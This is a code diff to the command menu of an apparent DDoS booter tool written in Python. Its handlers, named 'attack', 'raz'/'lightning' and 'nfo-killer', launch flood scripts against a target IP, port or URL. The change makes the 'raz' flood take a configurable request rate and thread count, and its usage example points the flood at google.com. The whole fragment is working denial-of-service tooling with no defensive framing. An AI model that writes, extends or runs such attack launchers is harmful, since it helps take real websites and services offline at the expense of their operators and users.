@@ -338,14 +338,16 @@ def main():
                 print('Usage: attack <ip> <port> <time> <methods : joker only>')
                 print('Example: attack 1.1.1.1 80 60 joker')
 
-        elif "RAZ" in cnc:
+        elif "raz" in cnc:
             try:
-                host = cnc.split()[1]
+                target = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'python3 url.py {host} {time} 5000 5000')
+                rate = cnc.split()[3]
+                threads = cnc.split()[4]
+                os.system(f'python3 url.py {target} {time} {rate} {threads}')
             except IndexError:
-                print('Usage: lightning <url> <time> <threads>')
-                print('Example: lightning https://www.google.com/ 80 5000 lightning')
+                print('Usage: lightning <url> <time> <rps> <threads>')
+                print('Example: lightning https://www.google.com/ 80 5000 5000')
 
         elif "nfo-killer" in cnc:
             try:
